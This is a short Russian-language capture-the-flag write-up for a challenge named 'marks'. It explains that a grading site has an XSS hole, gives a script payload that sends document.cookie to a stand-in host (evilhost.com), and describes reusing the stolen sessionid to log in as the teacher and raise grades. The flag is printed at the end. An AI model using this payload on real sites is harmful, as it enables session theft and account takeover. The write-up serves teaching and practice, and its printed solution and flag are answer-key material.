# marks

## Описание

Говорят, у одного учителя невозможно получить хорошую оценку по ctf'у. Можете разобраться?

(ссылка)

## Решение

Xss в одном из полей вопроса. Создадим такой пейлоад, который отправит на наш хост куки админа. Пример сервиса, позволяющий такое делать - requestbin.com

Возможный пейлоад:

```
<script> location = 'http://evilhost.com?cookie='+document.cookie; </script>
```

Далее, для того, чтобы зайти на аккаунт учителя, заменим значение куки `sessionid` на значение, полученное в запросе. Теперь остается только поставить себе несколько хороших оценок.

### Флаг
TeacherCTF{y0u_4r3_h0n0ur5_pup1l_4nd_x55_m4573r}